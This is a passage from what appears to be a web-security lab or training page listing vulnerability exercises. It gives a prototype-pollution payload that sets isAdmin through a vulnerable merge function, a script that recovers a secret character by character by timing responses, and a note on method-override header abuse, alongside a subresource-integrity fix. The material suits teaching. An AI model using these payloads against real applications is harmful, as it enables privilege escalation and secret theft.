18. Prototype Pollution JS

Polluting Object.prototype affects all objects. Can override security checks.

// Pollute via merge function vulnerability: var payload = JSON.parse('{"__proto__":{"isAdmin":true}}'); function merge(a,b){ for(var k in b){ if(typeof b[k]==='object') merge(a[k]=a[k]||{},b[k]); else a[k]=b[k]; } } merge({}, payload); protoCheck(); // now returns true for any object

// Vulnerable: <script src="https://cdn.example.com/lib.js"></script> // Safe (SRI hash): <script src="https://cdn.example.com/lib.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ..." crossorigin="anonymous"></script> // Generate hash: openssl dgst -sha384 -binary lib.js | openssl base64 -A

23. Timing Side-Channel Attack Side Channel

Non-constant-time string comparison leaks info via response time. Guess the secret character by character.

// Timing oracle: measure how many chars match prefix before failing (async()=>{ var chars='abcdefghijklmnopqrstuvwxyz0123456789'; var found=''; for(var pos=0;pos<8;pos++){ var best='', bestT=0; for(var c of chars){ document.getElementById('timing-input').value=found+c; var t0=performance.now(); timingCheck(); var t=performance.now()-t0; if(t>bestT){ bestT=t; best=c; } } found+=best; console.log('Found so far: '+found); } })();

26. HTTP Method Override Access Control

Some servers honour X-HTTP-Method-Override headers, allowing POST to masquerade as DELETE/PUT.
